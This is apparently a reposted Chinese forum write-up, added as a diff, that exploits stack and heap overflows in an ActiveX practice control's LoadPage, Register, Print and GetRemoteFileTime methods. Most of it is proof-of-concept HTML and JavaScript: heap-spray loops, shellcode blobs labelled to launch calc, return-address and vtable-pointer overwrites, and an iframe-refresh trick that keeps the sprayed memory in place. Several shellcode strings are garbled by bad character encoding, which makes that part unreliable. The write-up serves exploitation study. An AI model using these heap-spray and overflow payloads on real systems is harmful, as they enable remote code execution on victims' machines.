@@ -1,0 +1,386 @@
+
+# exploit_me(B)堆溢出，栈溢出利用分析
+
+> 原文：[`www.pediy.com/kssd/pediy09/pediy09-369.htm`](https://www.pediy.com/kssd/pediy09/pediy09-369.htm)
+
+> 花了不少时间，终于把它们搞定，发出来庆祝一下。
+
+> Author:dge
+
+> 栈溢出的利用：
+
+> `LoadPage`
+
+> `Register`
+
+> 堆溢出的利用：
+
+> `Print`
+
+> `GetRemoteFileTime`
+
+## 1.栈溢出的利用
+
+栈溢出往往是在把字符串拷贝到局部变量中时，没有做长度检查，用 `IDA` 对函数做简单的分析，我们就可以看出在 `LoadPage`，`Register` 中都存在这种问题。
+
+栈溢出利用比较简单，可以用 `heap spraying` 或利用跳板跳到栈中去执行已经布置好的 `shellcode`。
+
+下面用的是 `heap spraying` 的方法，先在 `0c0c0c0c` 区域布置上我们的 `shellcode`,再用 `0c0c0c0c` 覆盖返回地址。利用就完成了。
+
+`poc` 代码框架修改自 http://www.milw0rm.com/exploits/4366
+
+### LoadPage 方法的 poc
+
+代码:
+
+```
+<OBJECT id=target classid=clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2></OBJECT>
+<SCRIPT>
+document.write("<meta http-equiv=\"refresh\" content=\"1, " + window.location.href + "\"></meta>");
+var heapSprayToAddress = 0x0c0c0c0c;
+var shellcode = unescape(
+"%u9090" +
+// exec calc
+"⑴" +
+"荩" +
+"" +
+"桩；" +
+"淆" +
+"苣桩" +
+"" +
+"乾" +
+"釉" +
+""
+);
+
+var heapBlockSize = 0x100000;
+var payLoadSize = shellcode.length * 2;
+var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+var spraySlide = unescape("");
+spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+heapBlocks = (heapSprayToAddress)/heapBlockSize;
+memory = new Array();
+
+for (i=0;i<heapBlocks;i++)
+{
+        memory[i] = spraySlide + shellcode;
+}
+
+function getSpraySlide(spraySlide, spraySlideSize)
+{
+    while (spraySlide.length*2<spraySlideSize)
+    {
+        spraySlide += spraySlide;
+    }
+    spraySlide = spraySlide.substring(0,spraySlideSize/2);
+    return spraySlide;
+}
+
+var str1="FFFFFFFFFFFFFFFFFFFF";
+str=str1+str1+str1+str1+str1+str1+str1+str1+str1+str1+str1+str1+"FFFFFFFFFFFFFFFF"+"\\x0c\\x0c\\x0c\\x0c";
+target.LoadPage(str,1,1,1);
+</SCRIPT>
+```
+
+### Register 方法的 poc
+
+代码:
+
+```
+<OBJECT id=target classid=clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2></OBJECT>
+<SCRIPT>
+document.write("<meta http-equiv=\"refresh\" content=\"1, " + window.location.href + "\"></meta>");
+var heapSprayToAddress = 0x0c0c0c0c;
+var shellcode = unescape(
+"" +
+// exec calc
+"⑴" +
+"荩" +
+"" +
+"桩；" +
+"淆" +
+"苣桩" +
+"" +
+"乾" +
+"釉" +
+""
+);
+var heapBlockSize = 0x100000;
+var payLoadSize = shellcode.length * 2;
+var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+var spraySlide = unescape("");
+spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+heapBlocks = (heapSprayToAddress)/heapBlockSize;
+memory = new Array();
+
+for (i=0;i<heapBlocks;i++)
+{
+        memory[i] = spraySlide + shellcode;
+}
+
+function getSpraySlide(spraySlide, spraySlideSize)
+{
+    while (spraySlide.length*2<spraySlideSize)
+    {
+        spraySlide += spraySlide;
+    }
+    spraySlide = spraySlide.substring(0,spraySlideSize/2);
+    return spraySlide;
+}
+
+var str1="FFFFFFFFFFFFFFFFFFFF";
+str=str1+str1+str1+str1+str1+str1+str1+str1+str1+str1+str1+str1+str1+"\\x0c\\x0c\\x0c\\x0c";
+target.Register(str1,str);
+</SCRIPT>
+```
+
+## 2.堆溢出的利用
+
+### Print 方法溢出
+
+利用方法(1)
+
+这个方法很简单，就是在堆中覆盖上我们的 `shellcode`,然后通过某种方式跳到去堆中执行代码。
+
+我们在 `Print` 函数第一个参数中放入超长字符串，并刷新页面，就可以发现出现访问异常：
+
+`02173965    8B17            mov     edx, dword ptr [edi]  //edi 指向我们输入的字符串`
+
+`02173967    53              push    ebx`
+
+`02173968    50              push    eax`
+
+`02173969    57              push    edi`
+
+`0217396A    FF12            call    dword ptr [edx]       //此时 edx 就是我们输入的字符串的 ASCII。`
+
+`0217396C    8BE8            mov     ebp, eax`
+
+在这里 `edi` 是一个对象指针，上面的代码的意思是，通过对象指针获得虚函数表指针，再去虚函数表中找到虚函数的地址，并调用它。
+
+从这里可以看出，我们可以控制整个对象的内存，自然可以控制虚函数表指针。我们只要把这个虚函数表的指针覆盖成我们可以控制的内存区域指针，并在该区域开始的四字节中填上我们已经覆盖到内存中的 `shellcode` 地址就可以了。
+
+下面是 `Print` 方法的溢出利用 `poc`:
+
+`shellcode` 直接拷贝自 Bughoho 的代码
+
+代码:
+
+```
+<object id="target" classid="clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2"></object>
+
+<script language="javascript">
+var shellcode = unescape("hj
+8hcOffPfPfffPT³ 来+fAfAfpPhuserT301Y6XFFF=j
+8uUP\]XW\`<xY S,$\[3G3 也麾 P$⁶^X3:潦腽;T$uY$4{f\_S,$\[,\_a=j
+8u3hoho
+hdgehSPPSWW 烫烫烫");
+
+var  s = "A";
+while(s.length<480)
+{
+    s+="A"
+}
+s+="\x04\x06\x2d\x02";//覆盖对象中的虚函数表指针
+s+="\x08\x06\x2d\x02";//在虚函数表的第一项中填上 shellcode 的地址，也就是他后边的地址
+s+=shellcode;         //把 shellcode 覆盖到这里
+target.Print(s,1,1,1,1);
+document.write("<meta http-equiv=\"refresh\" content=\"1, " + window.location.href + "\"></meta>");//必须刷新，否则不会触发。
+</SCRIPT>
+```
+
+利用方法(2)
+
+利用 `heap` 风水中介绍的方法
+
+如下图所示（heap 风水中的图示）
+
+`object pointer   -->   fake object   -->   fake vtable     -->     fake virtual function`
+
+addr: `xxxx             addr: yyyy          addr: 0x0C0C0C0C        addr: 0x0C0C0C0C`
+
+data: `yyyy             data: 0x0C0C0C0C    data: +0 0x0C0C0C0C     data: nop slide`
+
+`                                                  +4 0x0C0C0C0C           shellcode`
+
+`                                                  +8 0x0C0C0C0C`
+
+如果完全按照这个思路，还是不行的，会发现在调用虚函数的时候总出现访问异常。
+
+我弄了很久也没弄出结果，最后还是某高手给解决的,thanks。
+
+下面解释下产生异常的原因：
+
+虽然可以溢出，但如果不刷新页面的话，那个调用虚函数的调用就不会被执行，也就无法利用了，所以必须刷新页面。但刷新页面的话，我们在 `0C0C0C0C` 区域布置的 `nop+shellcode` 就会被释放从而 `0C0C0C0C` 变的不可访问，这就是一直出现访问异常的原因。
+
+如何在通过刷新页面触发那个虚函数调用的前提下，让 `0C0C0C0C` 这个地址区域的内存不被释放呢?
+
+解决了这个问题，就可以成功利用了。
+
+解决方法是这样的，在主页面中用 `nop+shellcode` 覆盖 `0C0C0C0C` 区域。在页面中利用 `iframe` 嵌入一个页面，通过刷新 `iframe` 嵌入的页面，触发那个虚函数调用。
+
+代码:
+
+```
+<OBJECT id=target classid=clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2></OBJECT>
+<SCRIPT>
+document.write("<meta http-equiv=\"refresh\" content=\"1, " + window.location.href + "\"></meta>");
+var  s = "\x0c";
+while(s.length<1024)
+{
+  s += "\x0c";
+}
+target.Print(s,1,1,1,1);
+</SCRIPT>
+***************************************************************************************************
+<body>
+<iframe width=0 height=0 frameborder=0 scrolling=auto src=.\\Print.html></iframe>
+<script>
+var heapSprayToAddress = 0x0c0c0c0c;
+var shellcode = unescape(
+"" +
+// exec calc
+"⑴" +
+"荩" +
+"" +
+"桩；" +
+"淆" +
+"苣桩" +
+"" +
+"乾" +
+"釉" +
+""
+);
+
+var heapBlockSize = 0x100000;
+var payLoadSize = shellcode.length * 2;
+var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+var spraySlide = unescape("");
+spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+heapBlocks = (heapSprayToAddress-0x100000)/heapBlockSize;
+memory = new Array();
+
+for (i=0;i<heapBlocks;i++)
+{
+        memory[i] = spraySlide + shellcode;
+}
+
+function getSpraySlide(spraySlide, spraySlideSize)
+{
+    while (spraySlide.length*2<spraySlideSize)
+    {
+        spraySlide += spraySlide;
+    }
+    spraySlide = spraySlide.substring(0,spraySlideSize/2);
+    return spraySlide;
+}
+
+</script>
+</body>
+```
+
+### GetRemoteFileTime 方法溢出利用
+
+两种利用方法都和 `Print` 相同，下面只发下利用代码
+
+利用方法(1)
+
+代码:
+
+```
+<object id="target" classid="clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2"></object>
+<script language="javascript">
+var shell = unescape("hj
+8hcOffPfPfffPT³ 来+fAfAfpPhuserT301Y6XFFF=j
+8uUP\]XW\`<xY S,$\[3G3 也麾 P$⁶^X3:潦腽;T$uY$4{f\_S,$\[,\_a=j
+8u3hoho
+hdgehSPPSWW 烫烫烫");
+var  s = "A";
+while(s.length<684)
+{
+    s+="A"
+}
+s+="\x14\x06\x2d\x02";
+s+="\x18\x06\x2d\x02"
+s+=shell;
+target.GetRemoteFileTime(s);
+document.write("<meta http-equiv=\"refresh\" content=\"1, " + window.location.href + "\"></meta>");
+</SCRIPT>
+```
+
+利用方法(2)
+
+代码:
+
+
+
+
+```
+<OBJECT id=target classid=clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2></OBJECT>
+<SCRIPT>
+document.write("<meta http-equiv=\"refresh\" content=\"1, " + window.location.href + "\"></meta>");
+var  s = "\x0c";
+while(s.length<688)
+{
+  s += "\x0c";
+}
+target.GetRemoteFileTime(s);
+</SCRIPT>
+********************************************************************************
+<body>
+<iframe width=0 height=0 frameborder=0 scrolling=auto src=.\GetRemoteFileTime.html></iframe>
+<script>
+var heapSprayToAddress = 0x0c0c0c0c;
+var shellcode = unescape(
+"" +
+// exec calc
+"⑴" +
+"荩" +
+"" +
+"桩；" +
+"淆" +
+"苣桩" +
+"" +
+"乾" +
+"釉" +
+""
+);
+var heapBlockSize = 0x100000;
+var payLoadSize = shellcode.length * 2;
+var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+var spraySlide = unescape("");
+spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+heapBlocks = (heapSprayToAddress-0x100000)/heapBlockSize;
+memory = new Array();
+
+for (i=0;i<heapBlocks;i++)
+{
+        memory[i] = spraySlide + shellcode;
+}
+
+function getSpraySlide(spraySlide, spraySlideSize)
+{
+    while (spraySlide.length*2<spraySlideSize)
+    {
+        spraySlide += spraySlide;
+    }
+    spraySlide = spraySlide.substring(0,spraySlideSize/2);
+    return spraySlide;
+}
+</script>
+</body>
+```
+
+引用: `s`+=`"\\x04\\x06\\x2d\\x02"`;//覆盖对象中的虚函数表指针
+
+` s`+=`"\\x08\\x06\\x2d\\x02"`;//在虚函数表的第一项中填上 `shellcode` 的地址，也就是他后边的地址
+
+` s`+=`shellcode`; //把 `shellcode` 覆盖到这里
+
+`target.Print(s,1,1,1,1);`
+
+在实际情况中 `shellcode` 已经不知道跑到哪去了,所以这样做 可能不行
+
+还是得用 `heap` `spray`.
+
+`4dd466d0e1e0cc123afbe504da2462ca`
